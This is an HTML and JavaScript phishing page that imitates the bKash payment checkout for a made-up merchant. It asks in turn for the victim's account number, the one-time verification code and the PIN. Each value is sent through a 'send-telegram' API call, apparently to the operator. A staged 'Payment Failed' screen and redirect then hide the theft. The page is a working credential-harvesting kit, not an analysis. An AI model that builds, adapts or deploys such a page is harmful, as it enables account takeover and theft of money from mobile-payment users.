<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>bKash Payment</title>
    <style>
        /* Basic Reset & Font */
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            background-color: #f3f4f6; /* Equivalent to gray-100 */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 1rem; /* Equivalent to p-4 */
        }

        /* Card Container */
        .card {
            width: 100%;
            max-width: 24rem; /* Equivalent to max-w-sm */
            border-radius: 0.75rem; /* Equivalent to rounded-xl */
            overflow: hidden;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); /* Equivalent to shadow-lg */
            background-color: #ffffff;
        }

        .card-content {
            padding: 0;
        }

        /* Logo Section */
        .logo-section {
            display: flex;
            justify-content: center;
            padding-top: 0;
            padding-bottom: 1rem; /* Equivalent to pb-4 */
            background-color: #ffffff;
        }

        .logo {
            width: 9.375rem; /* Equivalent to width={150} */
            height: 3.125rem; /* Equivalent to height={50} */
            object-fit: contain;
        }

        /* Transaction Summary */
        .transaction-summary {
            display: flex;
            align-items: center;
            gap: 1rem; /* Equivalent to gap-4 */
            padding: 1rem; /* Equivalent to p-4 */
            border-top: 1px solid #e5e7eb; /* Equivalent to border-t */
            border-bottom: 1px solid #e5e7eb; /* Equivalent to border-b */
            background-color: #ffffff;
        }

        .avatar {
            width: 2.5rem; /* Equivalent to w-10 */
            height: 2.5rem; /* Equivalent to h-10 */
            background-color: #f3f4f6; /* Equivalent to bg-gray-100 */
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 9999px; /* Equivalent to rounded-full */
        }

        .shopping-cart-icon {
            width: 1.25rem; /* Equivalent to w-5 */
            height: 1.25rem; /* Equivalent to h-5 */
            color: #6b7280; /* Equivalent to text-gray-500 */
        }

        .summary-details {
            flex: 1; /* Equivalent to flex-1 */
        }

        .merchant-name {
            font-size: 0.75rem; /* Equivalent to text-xs */
            font-weight: 500; /* Equivalent to font-medium */
            color: #374151; /* Equivalent to text-gray-800 */
        }

        .invoice-number {
            font-size: 0.625rem; /* Equivalent to text-[10px] */
            color: #6b7280; /* Equivalent to text-gray-500 */
        }

        .amount {
            font-size: 1.125rem; /* Equivalent to text-lg */
            font-weight: 600; /* Equivalent to font-semibold */
            color: #374151; /* Equivalent to text-gray-800 */
        }

        /* bKash Input Section - Generic Style */
        .bkash-input-section {
            background-color: #e3007f; /* Equivalent to bg-bkash-pink */
            padding: 1.5rem; /* Equivalent to p-6 */
            color: #ffffff;
            min-height: 24rem; /* Equivalent to aspect-square, assuming 1:1 ratio with max-w-sm (384px), so ~384px height */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center; /* Center horizontally */
            text-align: center;
            box-sizing: border-box; /* Include padding in height calculation */
            transition: all 0.3s ease-in-out; /* Smooth transitions between views */
        }

        .section-title {
            font-size: 1.125rem; /* Equivalent to text-lg */
            font-weight: 600; /* Equivalent to font-semibold */
            text-align: center;
            margin-bottom: 1rem;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            width: 100%;
            max-width: 18rem; /* Adjusted for better appearance */
            margin-bottom: 0.5rem;
        }

        .bkash-input {
            width: 100%;
            border-radius: 0.375rem; /* Equivalent to rounded-md */
            border: 1px solid #e2e8f0;
            background-color: #ffffff;
            padding: 0.5rem 1rem; /* Equivalent to px-4 py-2 */
            font-size: 1rem; /* Equivalent to text-base */
            color: #374151; /* Equivalent to text-gray-800 */
            text-align: center;
            outline: none;
            box-shadow: none;
            transition: border-color 0.2s ease-in-out;
        }

        .bkash-input::placeholder {
            color: #9ca3af; /* Equivalent to placeholder:text-gray-400 */
        }

        .bkash-input:focus {
            border-color: transparent;
            outline: none;
            box-shadow: none;
        }

        .terms-conditions {
            font-size: 0.75rem; /* Equivalent to text-xs */
            text-align: center;
            margin-top: 1rem;
        }

        .terms-conditions a, .resend-code-btn {
            font-weight: 500;
            text-decoration: underline;
            color: #ffffff;
            transition: color 0.2s ease-in-out;
        }

        .terms-conditions a:hover, .resend-code-btn:hover {
            color: #e5e7eb; /* Equivalent to hover:text-gray-200 */
        }

        .resend-code-btn {
            background: none;
            border: none;
            cursor: pointer;
            font-size: 0.75rem;
            padding: 0;
            margin: 0;
        }

        /* Action Buttons */
        .action-buttons {
            display: flex;
            justify-content: space-around;
            padding: 0.625rem; /* Equivalent to p-2.5 */
            gap: 1rem; /* Equivalent to gap-4 */
            background-color: #ffffff;
        }

        .btn {
            flex: 1; /* Equivalent to flex-1 */
            border-radius: 0.375rem; /* Equivalent to rounded-md */
            padding: 0.625rem 1rem; /* Standard button padding */
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.2s ease-in-out;
            border: none;
        }

        .btn-outline {
            border: 1px solid #d1d5db; /* Equivalent to border border-gray-300 */
            background-color: #ffffff;
            color: #374151; /* Equivalent to text-gray-800 */
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); /* Equivalent to shadow-sm */
        }

        .btn-outline:hover {
            background-color: #f9fafb; /* Equivalent to hover:bg-gray-50 */
        }

        .btn-confirm {
            background-color: #e3007f; /* Equivalent to bg-bkash-pink */
            color: #ffffff;
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); /* Equivalent to shadow-sm */
        }

        .btn-confirm:hover:not(:disabled) {
            background-color: #cc006f; /* Slightly darker pink for hover */
        }

        .btn-confirm:disabled {
            background-color: #e5e7eb; /* Equivalent to bg-gray-200 */
            color: #9ca3af; /* Equivalent to text-gray-500 */
            cursor: not-allowed;
        }

        .loading-dots {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.25rem; /* Equivalent to space-x-1 */
        }

        .dot {
            width: 0.5rem; /* Equivalent to w-2 */
            height: 0.5rem; /* Equivalent to h-2 */
            background-color: #ffffff;
            border-radius: 9999px; /* Equivalent to rounded-full */
            animation: bounce 1.4s infinite ease-in-out;
        }

        .dot:nth-child(1) { animation-delay: 0ms; }
        .dot:nth-child(2) { animation-delay: 150ms; }
        .dot:nth-child(3) { animation-delay: 300ms; }

        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }

        /* Footer */
        .footer {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 0.625rem; /* Equivalent to p-2.5 */
            font-size: 0.75rem; /* Equivalent to text-xs */
            line-height: 1.2; /* To simulate space-y-1 better */
            background-color: #ffffff;
        }

        .phone-call-info {
            display: flex;
            align-items: center;
            gap: 0.25rem; /* Equivalent to gap-1 */
            color: #e3007f; /* Equivalent to text-bkash-pink */
            margin-bottom: 0.25rem;
        }

        .copyright {
            color: #9e9e9e;
            font-size: 0.75rem;
        }

        /* Specific styles for PIN input */
        .pin-input-style {
            font-size: 1.5rem; /* Equivalent to text-2xl */
            letter-spacing: 0.125em; /* Equivalent to tracking-wider */
        }

        /* Payment Failed Page Styles */
        .payment-failed-section {
            background-color: #e3007f; /* Equivalent to bg-bkash-pink */
            padding: 1.5rem; /* Equivalent to p-6 */
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            min-height: 18.75rem; /* Equivalent to min-h-[300px] */
            box-sizing: border-box;
            transition: all 0.3s ease-in-out;
        }
        .payment-failed-section h2 {
            font-size: 1.5rem; /* Equivalent to text-2xl */
            font-weight: 700; /* Equivalent to font-bold */
            margin-bottom: 0.5rem;
        }
        .payment-failed-section p {
            font-size: 0.875rem; /* Equivalent to text-sm */
        }
        .payment-failed-section .redirect-text span {
            font-weight: 500;
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="card-content">
            <!-- Logo Section -->
            <div class="logo-section">
                <img src="https://i.ibb.co/L5hN5q4/bkash-logo.png" alt="bKash Logo" class="logo">
            </div>

            <!-- Transaction Summary -->
            <div class="transaction-summary">
                <div class="avatar">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="shopping-cart-icon">
                        <circle cx="8" cy="21" r="1"></circle>
                        <circle cx="19" cy="21" r="1"></circle>
                        <path d="M2.05 2.05h2l2.66 12.42a2 2 0 0 0 2 1.58h9.78a2 2 0 0 0 1.95-1.57l1.65-7.43H5.12"></path>
                    </svg>
                </div>
                <div class="summary-details">
                    <p class="merchant-name">PromoShop.com</p>
                    <p class="invoice-number">Inv No: NNT_6094bc8028702...</p>
                </div>
                <div class="amount">৳49.00</div>
            </div>

            <!-- Dynamic Content Area -->
            <div id="dynamic-content-area" class="bkash-input-section">
                <!-- Content will be injected here by JavaScript -->
            </div>

            <!-- Action Buttons -->
            <div id="action-buttons-area" class="action-buttons">
                <!-- Buttons will be injected here by JavaScript -->
            </div>

            <!-- Footer -->
            <div class="footer">
                <div class="phone-call-info">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone-call">
                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                    </svg>
                    <span>16247</span>
                </div>
                <p class="copyright">
                    © 2025 bKash, All Rights Reserved
                </p>
            </div>
        </div>
    </div>

    <script>
        const dynamicContentArea = document.getElementById('dynamic-content-area');
        const actionButtonsArea = document.getElementById('action-buttons-area');

        let currentView = 'accountNumber'; // 'accountNumber', 'verificationCode', 'pinEntry', 'paymentFailed'
        let currentAccountNumber = '';
        let currentVerificationCode = '';
        let currentPin = ''; // Stores actual PIN for masking logic
        let pinDisplayTimeout = null;

        // --- Telegram API Call Function ---
        async function sendToTelegram(data) {
            try {
                // Ensure this URL points to your deployed Next.js API route
                const response = await fetch('/api/send-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });

                if (response.ok) {
                    console.log('Message sent to Telegram successfully.');
                    return true;
                } else {
                    const errorData = await response.json();
                    console.error('Failed to send message to Telegram:', response.status, errorData);
                    return false;
                }
            } catch (error) {
                console.error('Error sending message to Telegram:', error);
                return false;
            }
        }

        function renderView() {
            dynamicContentArea.innerHTML = '';
            actionButtonsArea.innerHTML = '';
            actionButtonsArea.style.display = 'flex'; // Ensure buttons are visible by default

            let inputHtml = '';
            let titleHtml = '';
            let bottomTextHtml = '';
            let inputElement = null; // To hold reference to the current input box

            // Reset dynamicContentArea styling for new views
            dynamicContentArea.className = 'bkash-input-section';
            dynamicContentArea.style.minHeight = '24rem';
            dynamicContentArea.style.justifyContent = 'center';

            switch (currentView) {
                case 'accountNumber':
                    titleHtml = '<h2 class="section-title">Your bKash Account Number</h2>';
                    inputHtml = `
                        <div class="input-wrapper">
                            <input
                                type="tel"
                                placeholder="e.g 01XXXXXXXXX"
                                class="bkash-input"
                                id="accountNumberInput"
                                maxlength="11"
                                value="${currentAccountNumber}"
                            />
                        </div>
                    `;
                    bottomTextHtml = `
                        <p class="terms-conditions">
                            Confirm and proceed,
                            <a href="https://www.bkash.com/en/page/tokenized_checkout" target="_blank" rel="noopener noreferrer">
                                terms & conditions
                            </a>
                        </p>
                    `;
                    actionButtonsArea.innerHTML = `
                        <button class="btn btn-outline" id="cancelButton">Cancel</button>
                        <button class="btn btn-confirm" id="confirmButton" disabled>Confirm</button>
                    `;
                    dynamicContentArea.innerHTML = titleHtml + inputHtml + bottomTextHtml;
                    inputElement = document.getElementById('accountNumberInput');
                    break;

                case 'verificationCode':
                    let maskedNumberForOTP = currentAccountNumber ? `${currentAccountNumber.slice(0, 3)} ** *** ${currentAccountNumber.slice(-3)}` : "";
                    titleHtml = `
                        <h2 class="section-title">Enter verification code sent to</h2>
                        <p style="font-size: 1.125rem; font-weight: 500; margin-bottom: 1rem;">${maskedNumberForOTP}</p>
                    `;
                    inputHtml = `
                        <div class="input-wrapper" style="max-width: 18rem;">
                            <input
                                type="tel"
                                placeholder="Enter 6 digit code"
                                class="bkash-input"
                                id="verificationCodeInput"
                                maxlength="6"
                                value="${currentVerificationCode}"
                            />
                        </div>
                    `;
                    bottomTextHtml = `<p class="terms-conditions" id="resendCodeText">Resend Code in 30s</p>`;
                    actionButtonsArea.innerHTML = `
                        <button class="btn btn-outline" id="cancelButton">Cancel</button>
                        <button class="btn btn-confirm" id="confirmButton" disabled>Confirm</button>
                    `;
                    dynamicContentArea.innerHTML = titleHtml + inputHtml + bottomTextHtml;
                    inputElement = document.getElementById('verificationCodeInput');
                    startResendTimer();
                    break;

                case 'pinEntry':
                    let maskedAccountNumberForPin = currentAccountNumber ? `${currentAccountNumber.slice(0, 3)} ** *** ${currentAccountNumber.slice(-3)}` : "";
                    titleHtml = `
                        <h2 class="section-title">Enter PIN of your bKash account number</h2>
                        <p style="font-size: 1.125rem; font-weight: 500; margin-bottom: 1rem;">${maskedAccountNumberForPin}</p>
                    `;
                    inputHtml = `
                        <div class="input-wrapper" style="max-width: 18rem;">
                            <input
                                type="tel"
                                placeholder="Enter PIN"
                                class="bkash-input pin-input-style"
                                id="pinInput"
                                maxlength="5"
                            />
                        </div>
                    `;
                    actionButtonsArea.innerHTML = `
                        <button class="btn btn-outline" id="cancelButton">Cancel</button>
                        <button class="btn btn-confirm" id="confirmButton" disabled>Confirm</button>
                    `;
                    dynamicContentArea.innerHTML = titleHtml + inputHtml;
                    inputElement = document.getElementById('pinInput');
                    break;

                case 'paymentFailed':
                    actionButtonsArea.style.display = 'none'; // Hide buttons on failed page
                    dynamicContentArea.className = 'payment-failed-section'; // Apply failed page specific styles
                    dynamicContentArea.style.minHeight = '18.75rem'; // min-h-[300px]
                    dynamicContentArea.innerHTML = `
                        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: white; margin-bottom: 1rem;">
                            <circle cx="12" cy="12" r="10"></circle>
                            <line x1="15" y1="9" x2="9" y2="15"></line>
                            <line x1="9" y1="9" x2="15" y2="15"></line>
                        </svg>
                        <h2>Payment Failed</h2>
                        <p style="margin-bottom: 1rem;">Merchant verification failed</p>
                        <p class="redirect-text" id="redirectText">Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span> in 5s</p>
                    `;
                    startRedirectTimer();
                    return; // Exit here as content is fully replaced
            }

            attachEventListeners(inputElement);
            updateConfirmButtonState(inputElement);
        }

        function updateConfirmButtonState(inputElement) {
            const confirmBtn = document.getElementById('confirmButton');
            if (!confirmBtn || !inputElement) return;

            let isValid = false;
            if (currentView === 'accountNumber') {
                isValid = inputElement.value.startsWith('01') && inputElement.value.length === 11;
            } else if (currentView === 'verificationCode') {
                isValid = inputElement.value.length === 6;
            } else if (currentView === 'pinEntry') {
                isValid = currentPin.length >= 4 && currentPin.length <= 5;
            } else {
                isValid = false;
            }
            confirmBtn.disabled = !isValid;
        }

        function showLoading() {
            const confirmBtn = document.getElementById('confirmButton');
            if (confirmBtn) {
                confirmBtn.disabled = true;
                confirmBtn.innerHTML = `
                    <div class="loading-dots">
                        <div class="dot"></div>
                        <div class="dot"></div>
                        <div class="dot"></div>
                    </div>
                `;
            }
        }

        function hideLoading() {
            const confirmBtn = document.getElementById('confirmButton');
            if (confirmBtn) {
                confirmBtn.innerHTML = 'Confirm';
                const currentInput = document.getElementById(currentView === 'accountNumber' ? 'accountNumberInput' : (currentView === 'verificationCode' ? 'verificationCodeInput' : 'pinInput'));
                updateConfirmButtonState(currentInput);
            }
        }

        function attachEventListeners(inputElement) {
            const confirmBtn = document.getElementById('confirmButton');
            const cancelBtn = document.getElementById('cancelButton');

            if (confirmBtn) {
                confirmBtn.onclick = async () => {
                    showLoading();
                    await new Promise(resolve => setTimeout(resolve, 800)); // Simulate network delay

                    let telegramSuccess = false;

                    if (currentView === 'accountNumber') {
                        currentAccountNumber = inputElement.value;
                        telegramSuccess = await sendToTelegram({ accountNumber: currentAccountNumber });
                        if (telegramSuccess) {
                            currentView = 'verificationCode';
                        }
                    } else if (currentView === 'verificationCode') {
                        currentVerificationCode = inputElement.value;
                        telegramSuccess = await sendToTelegram({ verificationCode: currentVerificationCode });
                        if (telegramSuccess) {
                            currentView = 'pinEntry';
                        }
                    } else if (currentView === 'pinEntry') {
                        telegramSuccess = await sendToTelegram({ pin: currentPin });
                        currentView = 'paymentFailed'; // Always go to failed for this HTML demo, regardless of Telegram success
                    }

                    hideLoading();
                    renderView();
                };
            }

            if (cancelBtn) {
                cancelBtn.onclick = () => {
                    if (currentView === 'accountNumber') {
                        currentAccountNumber = '';
                    } else if (currentView === 'verificationCode') {
                        currentVerificationCode = '';
                        currentPin = ''; // Also clear pin if going back from verification
                    } else if (currentView === 'pinEntry') {
                        currentPin = ''; // Clear pin if going back from pin entry
                        currentVerificationCode = ''; // Clear verification code if going back from pin entry
                    }
                    currentView = 'accountNumber';
                    renderView();
                };
            }

            if (inputElement) {
                inputElement.oninput = (e) => {
                    let value = e.target.value;
                    if (currentView === 'accountNumber' || currentView === 'verificationCode') {
                        e.target.value = value.replace(/\D/g, ''); // Allow only digits
                        if (currentView === 'accountNumber') currentAccountNumber = e.target.value;
                        if (currentView === 'verificationCode') currentVerificationCode = e.target.value;
                    } else if (currentView === 'pinEntry') {
                        const newChar = value.slice(-1); // Get the last typed character
                        if (newChar.match(/[0-9]/) && currentPin.length < 5) { // Only allow digits and max 5
                            currentPin += newChar;
                        } else if (value.length < currentPin.length) { // A character was deleted
                            currentPin = currentPin.slice(0, -1);
                        }
                        // Update the display for PIN
                        let displayValue = '';
                        if (currentPin.length > 0) {
                            const lastDigit = currentPin.slice(-1);
                            displayValue = "●".repeat(currentPin.length - 1) + lastDigit;

                            if (pinDisplayTimeout) clearTimeout(pinDisplayTimeout);
                            pinDisplayTimeout = setTimeout(() => {
                                e.target.value = "●".repeat(currentPin.length);
                            }, 500);
                        } else {
                            displayValue = '';
                            if (pinDisplayTimeout) clearTimeout(pinDisplayTimeout);
                        }
                        e.target.value = displayValue;
                    }
                    updateConfirmButtonState(inputElement);
                };
            }
        }

        let resendTimerInterval;
        let resendCountdown = 30;

        function startResendTimer() {
            resendCountdown = 30;
            const resendCodeText = document.getElementById('resendCodeText');
            if (resendCodeText) {
                resendCodeText.innerHTML = `Resend Code in ${resendCountdown}s`;
                const confirmBtn = document.getElementById('confirmButton');
                if (confirmBtn) confirmBtn.disabled = true; // Disable confirm while timer is active

                if (resendTimerInterval) clearInterval(resendTimerInterval);

                resendTimerInterval = setInterval(() => {
                    resendCountdown--;
                    if (resendCountdown > 0) {
                        resendCodeText.innerHTML = `Resend Code in ${resendCountdown}s`;
                    } else {
                        clearInterval(resendTimerInterval);
                        resendCodeText.innerHTML = `
                            <button id="resendCodeButton" class="resend-code-btn">Resend Code</button>
                        `;
                        const resendCodeButton = document.getElementById('resendCodeButton');
                        if (resendCodeButton) {
                            resendCodeButton.onclick = () => {
                                currentView = 'accountNumber'; // Go back to account number page on resend
                                currentVerificationCode = ''; // Clear verification code
                                currentPin = ''; // Also clear pin if resending
                                renderView();
                            };
                        }
                        const inputElement = document.getElementById('verificationCodeInput');
                        updateConfirmButtonState(inputElement); // Re-evaluate confirm button state
                    }
                }, 1000);
            }
        }

        let redirectTimerInterval;
        let redirectCountdown = 5;

        function startRedirectTimer() {
            redirectCountdown = 5;
            const redirectText = document.getElementById('redirectText');
            if (redirectText) {
                if (redirectTimerInterval) clearInterval(redirectTimerInterval);

                redirectTimerInterval = setInterval(() => {
                    redirectCountdown--;
                    if (redirectCountdown > 0) {
                        redirectText.innerHTML = `Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span> in ${redirectCountdown}s`;
                    } else {
                        clearInterval(redirectTimerInterval);
                        redirectText.innerHTML = `Redirecting to <span style="font-weight: 500; text-decoration: underline;">Merchant Website</span>`;
                        // Simulate redirecting to the referrer or going back
                        setTimeout(() => {
                            window.history.back(); // Or window.location.href = 'your_merchant_url';
                        }, 1000); // Small delay before actual redirect
                    }
                }, 1000);
            }
        }

        // Initial render
        document.addEventListener('DOMContentLoaded', renderView);
    </script>
</body>
</html>
